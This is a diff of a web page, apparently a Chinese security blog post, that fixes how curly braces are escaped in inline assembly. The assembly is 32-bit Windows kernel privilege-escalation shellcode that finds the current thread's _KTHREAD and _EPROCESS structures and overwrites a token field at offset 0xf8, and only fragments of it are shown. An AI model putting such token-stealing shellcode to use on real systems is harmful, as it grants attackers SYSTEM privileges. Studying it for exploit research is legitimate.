@@ -36,9 +36,9 @@
     <div class="post-content">
         <p>32位下提权shellcode</p>
 <pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">ShellCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+<span class="token punctuation">{</span>
     _asm
-    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
+    <span class="token punctuation">{</span>
         pushad
         mov eax<span class="token punctuation">,</span>fs<span class="token punctuation">:</span><span class="token punctuation">[</span>124h<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true">// 找到当前线程的_KTHREAD结构</span>
         mov eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>eax <span class="token operator">+</span> <span class="token number">0x50</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">// 找到_EPROCESS结构</span>
@@ -57,8 +57,8 @@
         mov <span class="token punctuation">[</span>ecx <span class="token operator">+</span> <span class="token number">0xf8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> edx
         popad
         ret
-    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>64位下</p>
 <pre><code>shellCode proc
